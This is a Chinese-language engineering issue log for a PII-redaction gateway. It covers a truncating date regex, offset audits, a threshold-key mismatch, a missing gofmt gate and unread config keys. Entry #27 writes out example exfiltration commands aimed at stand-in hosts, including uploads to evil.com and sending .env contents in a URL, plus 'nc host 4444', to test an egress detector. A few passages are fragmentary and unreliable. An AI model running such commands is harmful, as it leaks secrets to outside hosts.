  **工作量变大** + **测试二进制被塞进了无关的常驻对象**。

### 教训

1. **基准的工作量必须是被测对象之外的常量。** 一旦工作量由「被测系统的当前行为」
   派生，「系统变好」就会以「性能回退」的形式报出来。这是**假阳性**，
   与 B-11 / B-16 同类（把设计意图的变化当成实现做错了）。
2. **`allocs/op` 是判断「工作量是否变了」的可靠信号。** 时间数字受共享 runner
   噪声干扰（本次 CI 与本地都出现过 2 倍以上抖动），而 `B/op` / `allocs/op`
   是确定性的 —— 怀疑「是回归还是工作量变了」时，先看这两个数。
3. **`-count=6` 取最小值挡不住工作量变化。** min-of-N 压得掉噪声，压不掉真实
   的工作量差异。别把「取了 min 就稳」当成免于根因分析的理由。

> 同一耦合在 `internal/cache/merkle_bench_test.go` 也存在，但那是**有意**的
> （注释写明「用真实 RegexEngine 检测，避免基准只量到 stub」），其语义就是
> 「检测 + Merkle 的联合成本」，故**不动**。代价是：检测器大幅变慢会同时触发
> cache 与 replacer 两处门禁 —— 可以接受，但排查时要记得第二处。

## 🟢 B-24 · `reDate` 的日分支「短优先」→ 日期跨度被截断 ✅ 已修

**现象**：`2024-09-17` 只报出 `2024-09-1`，其后的 `7` 落在 span 之外。
脱敏只替换 span 内的字节，于是**输出的原文里残留尾巴**：

| 原文 | 引擎返回的 span | 替换后 |
|---|---|---|
| `订单日期 2024-09-17 已完成` | `[13,22)` = `2024-09-1` | `订单日期[占位符]7 已完成` |
| `签署于 2024年12月31日 当天` | `[10,23)` = `2024年12月3` | `签署于[占位符]1日 当天` |

10 个书写形态实测 **8/10 被截断**（`-` / `/` / `.` / `年` 四种分隔符、含 `1999-11-30`），
规律是「**日 ≥ 10 就只留第一位**」；中文形态还多丢一个 `日`。

**根因（不是「写得不严谨」，是语义理解问题）**：
日部分的选择支写成短优先 `(?:0?[1-9]|[12][0-9]|3[01])`，而日后面跟的是**可选**的 `日?`。
Go regexp 取 **leftmost-first** —— 按交替的书写顺序返回**最先到达接受态**的那一支，
不再尝试后面的分支。短分支匹配到第一位数字时就已经是接受态 ⇒ 截断。

**判据（比修法更值钱）**：**看交替后面跟的是必需元素还是可选元素，不是看写法本身。**

| 交替后面跟什么 | 后果 | 本仓实例 |
|---|---|---|
| **必需**元素（必须有位数 / 分隔符） | **不出错** —— 短分支导致整体失败，引擎回退去试长分支 | `reIDCard18` / `reIDCard15` 的日（后跟 `[0-9]{3}`）；`reDate` 的月（后跟 `[-/.月]`） |
| **可选** / 结尾无锚 | **出错** —— 短分支成功即返回 | `reDate` 的日（后跟 `日?`） |

全仓 20 条正则逐条筛过，**只有 `reDate` 的日**命中第二种。
该判据已写进 `regex.go` 的注释。

**修复**（`efbfdac`）：日选择支重排为长优先 `(?:3[01]|[12][0-9]|0?[1-9])`，月保持原样。
RE2 是 NFA 优先级模拟而非回溯引擎，重排只改分支优先顺序、不改匹配开销 ——
实测同机交错 A/B（各 2 轮 × `count=6` 取最小）：`BenchmarkRegexEngineDetect` **1.066×**、
`DetectBatch` **0.998×**，均在 1.25× 容差内。

**验证**：10 个形态 8/10 → **0/10**，且「短分支恰好够用」的对照样本
（`2024-01-05`、`2024-09-1`）仍取满 —— 说明长优先没有反向吃掉正确结果。

**影响面为零（可证明，不是估计）**：四份 fixture 的 `"date"` 标注数全为 0、
`(19|20)\d\d[-/.年]` 形态文本数全为 0 ⇒ 指标不可能动。复跑全部语料**逐位不变**：
28 条门禁 span 0.7027 / 318 条矩阵 span 0.9664 / 合成中英 F1=1.0 / L2 `regressions=0`。

> ⚠️ 第 2 项初查 `cases_en.jsonl` 报 **30 处**命中，是**误报**：那是 `since 2023.`
> 的**句末句号**被 `[-/.]` 吃掉，而 `reDate` 还需要「分隔符 + 月 + 分隔符 + 日」才匹配。
> **见到非零先逐条看原文。**

**教训**

1. **「有函数」不等于「有覆盖」。** 这个缺陷此前对 CI 完全不可见：语料里没有 `date` 标注，
   而合成语料生成器里的 `gen_date()` 是**死代码**（定义了从未调用）。
   09-21 那轮因此误判「改了会动 F1=1.0 基线」而暂缓。要判断一个形态有没有被覆盖，
   得数**标注**和**文本**两个计数，不能看代码里有没有对应的生成函数。
2. **跨度错误比漏检更隐蔽。** 漏检会被 FN 计数抓住；跨度短一截只会让输出里多个尾巴，
   而它对「是否检出」的统计毫无影响。凡是「替换型」系统，都要额外核对**值是否等于原文切片** ——
   `regex_shape_test.go` 的 `detectSet` helper 就是干这个的。
3. **单测里「只断言类型、不断言值」的用例，往往是缺陷的化石。** 本轮修完即把它升级为
   断言完整值（`TestRegexEngine_ShapeToleranceKeepsSeparatorRules`），并另立
   `TestRegexEngine_DateSpan` 覆盖 10 个形态（含「短分支恰好够用」的对照样本）。

## 🔵 B-25 · `gate_only` + span 口径使「跨度被截断」对基准**结构性不可见** ⏸ 本轮只核查，未改评估器

**这是 B-24 的元问题**：B-24 能被发现是**偶然** —— 靠人肉读正则 + 起服务实测，
而不是靠基准。机制上是三重叠加：

1. `bench_runner_adversarial.py` 走 `gate_only=true`，该模式**不返回 offset**
   （脚本自己注释：「gate_only 不返回 offset，用 0/0 占位」）。评估器**从头到尾不校验偏移**。
2. 匹配只看 `(type, value)`。
3. 而 **span 口径的判据是「类型相同 且 值相等**或互为子串**」** —— 截断值
   `2024-09-1` 恰好是被截断真值 `2024-09-17` 的**子串** ⇒ **即便语料里有 date GT，
   这个缺陷也会被计为 span 命中**。

**影响范围**：所有「值尾部被截短」的缺陷。对脱敏网关而言这类缺陷会**污染输出**
（替换后残留尾巴），但在指标上**完全静止** —— 该指标对此类缺陷零敏感度。
反过来说，**`strict` 口径能抓到**（它要求逐字相等），所以「同时看 span 与 strict」
这条既有纪律是有价值的；但本次连 strict 也抓不到，因为**语料里根本没有 date GT**。

**本轮核查（只读，未改动评估器）**：对四份语料**全量 766 条文本**调 `/_api/detect`
（该端点返回 offset，`configs/bench-gate.yaml` 已 `debug: true`），校验四条偏移不变量：

| 不变量 | 为什么重要 | 违规数 |
|---|---|---|
| `Value` 逐字节等于 `text[Start:End]` | 偏移一旦错位，脱敏会改到别的字符上 | **0** |
| `0 ≤ Start < End ≤ len(text)` | 空区间/越界会让替换 panic 或吞掉相邻字符 | **0** |
| 偏移不落在多字节字符中间 | 否则替换出来的文本是**坏 UTF-8** | **0** |
| 按 `Start` 升序且互不重叠（契约 §2.1） | 重叠区间会让替换结果错乱 | **0** |

共 1032 个实体，**四条全部成立** ✅。也就是说当前实现是干净的 ——
缺的不是正确性，而是**守门**：没有任何自动化手段能在下一次改动后继续保证它。

**方案（待拍板，本轮未做）**：把这次的一次性巡测变成常驻守门，与 `carriers.py` 平级。
新建 `cn-pii-bench/offset_audit.py`（或 `LLMate-Gate/scripts/`），在 `bench-gate` job 里
作为**独立一步**运行：对四份语料全量打 `/_api/detect`，校验上述四条不变量，
任一违规即非零退出。

- 成本：766 次本地请求，秒级；不触碰现有任何阈值与数字（这四条是**不变量**，
  不是统计量，不存在「贴近边界」的脆弱性）。
- 前置条件：`debug: true`（`configs/bench-gate.yaml` 已有；`/_api/detect` 是控制面
  loopback 端点，基准场景可接受）。
- 为什么不复用评估器：`gate_only` 不返回 offset，而**非 gate_only 的
  `/v1/privacy/redact` 会走上游 LLM**（本机实测 `upstream connect failed`）——
  所以偏移校验只能走 `/_api/detect`，天然是一条独立通路。

## 🟢 #27 · 规则后端把「下载」判成 `network_egress` ✅ 已修（2026-09-23 二轮）

### 现象

`rules.assess` 的外发分支只问「工具在不在外发表里 + host 在不在白名单」：

```go
if bin := firstTool(cmds, egressTools); bin != "" {
    if host != "" && !r.hostWhitelisted(host) {
        add(types.CatEgress, sevEgress, "出站到非白名单 host："+host)
    }
}
```

于是 `curl -o deps.tar.gz https://example.com/deps.tar.gz`（**下载**）被判成 `network_egress`
（sev 0.60 → review）。**取回不是外发** —— 这是分类错误，不是口味问题。

### 为什么必须修

curl / wget 是 agent 工作流里最常见的网络动作，其中下载（拉依赖、取数据、探活）占绝大多数。
把它们一律算成外发，会让「外发」这个信号被无用告警淹没 —— 而一个总在喊狼来了的判断层
会被用户直接关掉，那比漏报更彻底地失效（同 `probe.go` 对塌缩的说明）。

### 修复

新增 `isFetchOnly(cmds, text)`：判定整条命令是否**只取回、不携带自有数据送出**。
判据是「**明确**是取回」而不是「**可能**是取回」——方向有任何不确定就退回按外发处理：

| 触发退回外发 | 理由 |
|---|---|
| 命令里有 `scp` / `rsync` / `nc` 等非方向敏感外发工具 | 整条不是「只取回」 |
| 出现正文旗标（`curl`：`-T --upload-file -d --data* -F --form* --json -X POST/PUT/PATCH`；`wget`：`--post-data` / `--post-file` / `--body-*`） | 可能带自有数据出去 |
| 命令行含 `$(` / `${` / 反引号 | 数据可以藏在 URL 里：`curl "https://x/?d=$(cat .env)"` |

命中取回时**仍记一条 benign 证据**把判据留在报告里（`只从网络取回，未携带自有数据出站：curl`）——
「为什么什么都没报」与「报了什么」同样需要可解释，否则用户只能看到一片沉默。
severity 为 0，因此有任何其他命中时都会被 `bestEvidence` 压过去，不会掩盖真实信号。

### 实施中踩的坑（值得留档）

第一版 `hasOutboundDataFlag` 先 `strings.ToLower(args[i])` 再比对旗标表 `"TdF"` ——
于是 `-T` 变成 `-t`，**匹配不上**，`curl -T repo.tar.gz https://evil.com/up` 被判成「只取回」。
这条命令**同时是既有测试 `TestRules_CategoryTable` 的用例**，立刻红灯。

根因：**curl 的短旗标是大小写敏感的**，不能先归一化：

| 旗标 | 含义 | 小写同形 | 含义 |
|---|---|---|---|
| `-T` | 上传文件 | `-t` | telnet-option（不带数据） |
| `-F` | multipart 表单 | `-f` | `--fail`（不带数据） |
| `-d` | 请求正文 | `-D` | `--dump-header`（不带数据） |

现在的写法：**长旗标不区分大小写（`--DATA` ≡ `--data`），短旗标区分**。
短旗标还要按**字符**扫而不是按整词比 —— 它们会连写（`curl -sT file URL` 的 `T` 藏在 `-sT` 里）。
`-X` 同理：只有大写 `X` 是 method，小写 `x` 是代理。

测试 `TestRules_FetchIsNotEgress`：14 条取回（含 `-D`/`-f`/`-x` 三个「形似危险实际无害」的对照）必须 benign，
8 条可能带数据出去的形状必须仍是 `network_egress`。

### 现象

`extractHost` 只认两种形态：带 scheme 的 URL（`http(s)://` / `ftp://`）与 `user@host:path`。

> 再去看它成不成立** —— 如果反过来（先看行为再写断言），这个缝会一直是绿的。

### 修复

```go
case knowsSendsTargetInvisible(cmds, text):
    add(types.CatUnknown, 0, "确定在往外送数据，但目标 host 不可见："+bin)
```

`knowsSendsTargetInvisible` 认三种「确定在送」的来源：

| 来源 | 例子 |
|---|---|
| curl / wget 带了正文旗标 | `curl -T f evil.example.com/up`、`wget --post-file=f h` |
| 传输型工具带了操作数 | `ssh host`、`nc host 4444`、`rsync … host:/d` |

## 🟡 #29 · 后端名与阈值表的键不一致 → 配置里的阈值静默失效 ✅ 已修（2026-09-23 二轮）

### 现象

`judgment.thresholds`（全局）与 `backends[i].thresholds`（per-backend）都是**可选配置**，
配了就该生效。但装配链上有两处名字对不上：

```go
// cmd/llmate-gate/main.go:460  —— 投影，用的名字来自**配置**
th := b.EffectiveThresholds(jc.Thresholds)
specs = append(specs, judge.Spec{Name: b.Name, ..., Thresholds: &th})

// internal/judge/factory.go:56 —— 登记，用的名字也来自**配置**
e.SetMapper(sp.Name, th, backends[i].Capabilities().GivesConfidence)

// internal/judge/map.go:221   —— 查表，用的名字来自**证据**
v := e.mapperFor(ev.Engine).Map(ev)   // ev.Engine = 后端自己盖的名字
```

登记与查表用的是两个不同的名字来源。对 `kind=openai` / `kind=http` 二者恰好相等
（它们的 `Name()` 直接返回 Spec 里的名字），但 **`kind=rules` 不是**：

```go
// 修复前：internal/judge/rules.go
func (r *Rules) Name() string { return "rules" }   // 写死，配置里的 name 被丢掉
```

于是 `name: policy` + `kind: rules` 这个组合下：

| 名字 | 值 | 用途 |
|---|---|---|
| 配置 `name` | `policy` | 投影、`SetMapper` 的键 |
| `Rules.Name()` | `rules` | **`Evidence.Engine`**，即查表的键 |

查的是 `mappers["rules"]`，而登记进去的是 `mappers["policy"]` —— 查不到，于是落到
`e.fallback`（`DefaultThresholds()` + 不做 confidence 加权）。**用户调的阈值一个都不生效，
而且没有任何报错、没有任何日志。**

顺带第二个后果：两个 `kind=rules` 后端只要配置里名字不同（`name: a` / `name: b`），
配置校验会放过，但 `NewEvaluator` 会因为两者都自报 `rules` 而报
`duplicate backend name "rules"` —— 报错信息里出现的名字用户压根没写过。

### 为什么值得单列一条

这不是「阈值算错了」这类看得见的错，而是**配置空转**：配置项被解析、被校验、被
`EffectiveThresholds` 认真合并、被投影进 Spec、被 `SetMapper` 存进 map —— 每一步都做了，
只是 key 对不上。使用者唯一的观察是「我改了阈值，行为没变」，而这很容易被解释成
「阈值不该这么调」而不是「阈值根本没生效」。

> 这是本项目第三次遇到同一族问题（另两次：`vault.persist`、`policy.tool_call_scan`）。
> 共同形状是**写进去的值没有任何读取方**。所以修法都选了同一条路：让它在装配期炸掉，
> 或者把不变量做成结构性的，而不是留着当「已知限制」。

### 修复

**（1）规则后端认识自己的名字**（`internal/judge/rules.go`）

```go
const DefaultRulesName = "rules"

func NewRules(wl Whitelist) *Rules { return NewNamedRules(DefaultRulesName, wl) }

func NewNamedRules(name string, wl Whitelist) *Rules {
	if name == "" {
		name = DefaultRulesName
	}
	return &Rules{name: name, whitelist: wl}
}

func (r *Rules) Name() string { return r.name }
```

`NewRules` 保留为「缺省名」的便捷构造，因此所有既有调用点（探针、bench、
`judge-bench`、既有测试）一行未改；装配路径改走 `NewNamedRules(sp.Name, …)`。

**（2）把不变量做成装配期检查**（`internal/judge/factory.go`）

```go
// 名字必须与 Spec 一致，这里不等就直接拒绝装配。
if got := b.Name(); got != sp.Name {
	return nil, fmt.Errorf("judge: backends[%d] is named %q but its spec says %q; "+
		"a backend's own name keys its threshold table, so the two must match", i, got, sp.Name)
}
```

同时把 `SetMapper` 的键从 `sp.Name` 换成 `backends[i].Name()`
—— 让「键 = 后端自报名」这条不变量在调用点上是自明的，而不是靠两个名字恰好相等。

这一条是给**未来**的 `kind` 用的：今天三种 kind 都会认自己的名字，所以这个分支
按现状不可达（也就没法用测试覆盖）。它拦的是「新加一种后端类型、又偷懒写死名字」时
会重新长出来的同一个缝。

### 验证

`cmd/llmate-gate/main_test.go`（新建，包内测试 `buildJudgment`）：

| 测试 | 钉住的性质 |
|---|---|
| `TestBuildJudgment_ThresholdsAreKeyedByBackendName` | **本条缺陷的钉子**：`name: policy` + 全局阈值必须生效 |
| `TestBuildJudgment_GlobalThresholdsReachTheBackend` | `name: rules` 时全局阈值生效（对照，证明差别在名字不在阈值） |
| `TestBuildJudgment_BackendThresholdsOverrideGlobal` | per-backend 优先于全局，**双向**都测 |
| `TestBuildJudgment_ThresholdDefaults` | 不配阈值 → 内置缺省 |
| `TestBuildJudgment_RejectsEmptyAndUnknown` | 空后端 / 未知 kind 在装配期报错 |
| `TestBuildJudgment_BackendOrderIsDegradationOrder` | 链顺序 = 配置顺序 |
| `TestBuildJudgment_SchemaModeProjection` | 5 种 `schema_mode`（含空值 → `prompt_only`）经三层投影后的实际能力声明 |
| `TestBuildJudgment_MaxInputBytesProjection` | `max_input_bytes` 投影 |
| `TestBuildJudgment_FailClosedProjection` | `fail_closed` 投影 + 兜底裁决带 `engine=fallback` 标签 |

**揭露过程**：先只写下断言、不改代码，跑出来 9 组里**恰好 1 组红**
（`ThresholdsAreKeyedByBackendName`：expected `allow`，actual `review`），
其余全绿 —— 这个「只红一组、且红的正是名字那组」的形状，直接把根因锁到名字上，
而不是让「是不是阈值算法有问题」变成一个开放问题。

> **教训（与 #28 同源，值得再写一遍）**：这次的红是**设计出来的红**。如果先读代码
> 判断「看起来没什么问题」再写测试，那条断言大概率会被写成 `name: rules` 的形式
> —— 然后一切正常，缝继续留着。**测试的价值来自断言先于观察**；观察之后再补的断言，
> 只会把现状固定下来。




## 🟢 #30 · 格式一致性零门禁 ✅ 已修（2026-09-23 二轮）

### 现象

在 `gateway/` 下跑 `gofmt -l .` 报 5 个文件，而 **CI 与 lint 一路绿灯**：

```
debug/handler.go
debug/hub.go
debug/store.go
pkg/global/global.go
pkg/global/global_test.go
```

根因在 `gateway/.golangci.yml`：**没有 `formatters:` 段**。

```yaml
version: "2"
linters:
  enable: [errcheck, govet, staticcheck, unused, ...]   # 只有 linters
# ← 没有 formatters
```

golangci-lint v2 把 gofmt / goimports / gofumpt 移到了顶层 `formatters`，
**不在 `linters` 下**。不显式声明就完全不跑 —— 于是「格式一致性」这个维度
在本仓**没有任何门禁**（CI 里也没有独立的 gofmt 步骤）。

### 三个文件是三种性质，不能混为一谈

| 类别 | 文件 | gofmt 要改 | 性质 |
|---|---|---|---|
| **A. 真实格式缺陷** | `pkg/global/global_test.go` | 24 行 | 见下 |
| B. 文件尾缺换行 | `debug/hub.go`、`pkg/global/global.go` | 各 4 行 | 卫生问题 |
| C. Go 1.19 前的 doc-comment 排版 | `debug/handler.go`、`debug/store.go` | 31 / 17 行 | **工具链年代差异**，不是作者失误：Go 1.19 起 gofmt 会重排缩进式注释块 |

A 类值得单说。它是 4 处这样的行（`{` 与 `t.Run(…)` 之间夹一个**字面 TAB**，本该是换行）：

```go
for _, tc := range cases {		t.Run(tc.v, func(t *testing.T) {
```

`git blame` 追到 `c35dbe8`（2026-09-12），提交标题是
**「chore(lint): 引入 golangci-lint 保守规则集并清零全部 11+8 处告警」**，
其中一条是 `copyloopvar×5：删 Go 1.22+ 冗余的 tc := tc 循环变量拷贝` —— 删拷贝时把换行弄丢了。

同一提交还写着「**本地 golangci-lint v2 复跑：0 issues；go test ./... 全过**」。

**那句话是真的。** 配置里没有格式检查，所以它看不见自己留下的痕。这个残渣
存活了 **11 天、跨 4 个提交、每轮 CI 全绿**，没有任何机制会把它报出来 ——
它能编译、能过测试、能过 lint。

> 与 #26 / #29 同族：**没有读取方 / 没有门禁的约束，等于不存在。**
> 区别只在于前两次是「配置项没人读」，这次是「文件属性没人看」。
> 同理，这与 B-25（偏移不变量对基准结构性不可见）也是同一族。

### 修复

1. 全仓 `gofmt -w`（5 个文件；其中 48 行是 C 类注释重排，**零语义改动**）。
2. `.golangci.yml` 增加格式门禁：

```yaml
formatters:
  enable:
    - gofmt
```

3. 同步 CI 里逐条枚举规则集的注释（`.github/workflows/ci.yml` 的 `lint` job），
   把 `formatters: gofmt` 一并写上 —— 否则注释继续只列 8 个 linter，
   下一个人仍会以为「规则集就是那 8 个」。

### 验证：**先确认门禁有牙齿，再审自己**

这一步不是可选的。门禁类改动最典型的失败是「配了但没生效」——
而那恰恰是本条要修的病（#26 / #29 都是「配了但没生效」）。
所以依次做了三组实验：

| 实验 | 目的 | 结果 |
|---|---|---|
| 把**已提交文件** `internal/judge/rules.go` 的一行 TAB 换成 4 空格 | 验证 `run` 会不会报 | ✅ 报出 `gofmt: 1` |
| 新建一个**未跟踪**的违规文件 | 排除「未跟踪文件不被检查」 | ❌ 不报 gofmt（**但只报 unused**）→ 假设不成立，继续查 |
| 同一违规文件，函数改成**导出名**（消掉 `unused`） | 隔离「被别的 linter 报过」这个变量 | ✅ 报出 `gofmt: 2` |

第三组把机制钉死了：**是 `issues.uniq-by-line`（默认 true）按行去重** ——
未导出函数同时命中 `unused`(4:6) 与 `gofmt`(4:1)，同一行只留一条。
用 `uniq-by-line: false` 复跑确认两条同时出现。

**结论：`uniq-by-line` 保持默认。** 它是可用性差异而非盲区 ——
文件照样进不了门禁，`gofmt -w` 一次全修完；改成 false 只会平白增加输出噪声。
这条实测定论已写进 `.golangci.yml` 的注释，免得后人重新推一遍。

> **可复用的纪律**：门禁类改动必须做「注入违规 → 确认被拦 → 还原」的对照组。
> 第一次实验给出的 `0 issues` 是**假绿**（缓存 + `uniq-by-line` 两个因素叠加），
> 如果就此收工，交付的会是一个「看着配好了、实际不报」的门禁 —— 即又一个 #26。

### 附带发现

`git blame` 与 `gofmt -l` 的组合可以回答一个平时很难答的问题：
「这个文件的不规范是**遗传**的还是**新引入**的」。C 类那两个文件是前者
（整篇注释都是旧排版，属工具链年代），A 类是后者（单个提交弄丢了换行）。
两者的处置完全不同 —— 前者一次 `gofmt -w` 抹平即可，后者值得追到哪个提交、
以及那个提交当时为什么没被发现（答案就是本条标题）。


## 🟡 #31 · 8 个「零读者 / 仅校验」的配置键 ✅ 已处置（2026-09-23 二轮）

### 怎么找到的：把检出方式机械化

#26（`policy` 两个假开关）、#29（阈值表的键对不上）、#30（格式零门禁）三次都是
**「没有读取方就等于不存在」**这同一族。既然如此，就不该再靠逐个巧合去撞，而应当
把判据写成可机械执行的检查：

```
1) 抽出 internal/config 下全部带 yaml tag 的字段（本仓 77 个）
2) 逐个在 config 包**之外** grep「.字段名」—— 零引用 = 投影层没接上
3) 再在 config 包**内** grep —— 只有「声明 + Default() 赋值 + Validate() 校验」
   也算零读者：写它的地方存在，读它的地方不存在
```

同一套方法顺手扫了指标侧（19 个指标逐个找写入点）：**全部有写入且路径正确，无死指标**
——P1-6 那类问题没有复发。**干净的负结果也是结果**，它说明这道门禁守住了。

### 结论：8 个键

| 字段 | yaml 键 | 示例配置 | 代码中的**全部**出现 |
|---|---|---|---|
| `RequestTimeout` | `gateway.request_timeout` | 5 个文件 | 声明 + `Default()=30s` + `Validate` 补默认 |
| `LogLevel` | `gateway.log_level` | 5 个文件 | 声明 + `Default()="info"` |
| `FallbackRegex` | `detection.fallback_regex` | 5 个文件 | 声明 + `Default()=true` |
| `StartTimeout` | `sidecar.start_timeout` | 2 个文件 | 声明 + `Default()=60s` |
| `RestartLimit` | `sidecar.restart_limit` | 2 个文件 | 声明 + `Default()=3` |
| `AutoStart` | `sidecar.auto_start` | 2 个文件 | 声明 + `Default()=false` |
| `KeyDerivation` | `vault.key_derivation` | 5 个文件 | 声明 + `Default()="scrypt"` |
| `Encryption` | `vault.encryption` | 5 个文件 | 声明 + **仅 `Validate` 校验取值** |

两个额外的、只有读代码才知道的事实：

- **全仓没有任何日志级别机制**（无 `slog`、无 `LevelVar`）⇒ `log_level: debug` 不只是
  「被忽略」，而是**连可以忽略的目标都不存在**。用户改完级别、什么都没发生，也无从察觉。
- **全仓没有一处 `os/exec`** ⇒ 网关**从不**拉起 sidecar 子进程。`auto_start` 的注释写着
  「true 时由网关 exec 拉起子进程」，而 `true` 与 `false` 没有任何差别。

### 严重度：为什么给 P1 而不是 P2

手机号/身份证没出机器，实际都发出去了。**这是本次唯一需要显式「更正」而非「补注」的地方。**

> **`vault.encryption` 是另一种更隐蔽的形态：validate-only。** 代码检查它的取值是否合法
> （`unsupported vault.encryption: %q`），却不用它配置任何东西。校验的存在让键看起来**是活的**
> ——用户读到那条错误会以为「只是不支持我写的这个算法」，而真相是「支持的那个也不生效」。
> **一个只校验不使用的字段，比一个纯死字段更容易骗人。**

### `registry` 的定位（顺带纠正一处可能的误读）

det = registry.Wrap(det, piiReg)

### 教训

> **清单类声明不能用「回想」来核 —— 它不是知识题，是算术题。**
> 「还有哪些没列」在信息上等价于「全集减已列集」，而全集**就摆在磁盘上**。
> 一旦用回想代替相减，漏项就不再是粗心问题，而是**判据问题**：
> 补 6 个漏 3 个，且被记成「已完成」。
>
> ⇒ **规则**：但凡文档里出现「清单/表/树」这类声明，核对一律用**集合差**，
> 并把**命令一起写进文档**（§1.1 已照此办理）。
> 只写结论「已补录」「已对齐」的台账条目，下一个读者无法判断它管到哪一层 ——
> 这一条已分别由 #22、#35（A17）、#37（C21）各付过一次学费。
>
> 附带一条措辞教训：**「解耦」这种强断言要按代码核**。
> 它比「无依赖」更弱（只说互不依赖，没说单向），但读者读到的往往是更强的意思。
> 本次把它改成「单向依赖 `global → cn`，无环，但不是解耦」——从「定性」降级为「可验证的事实」。
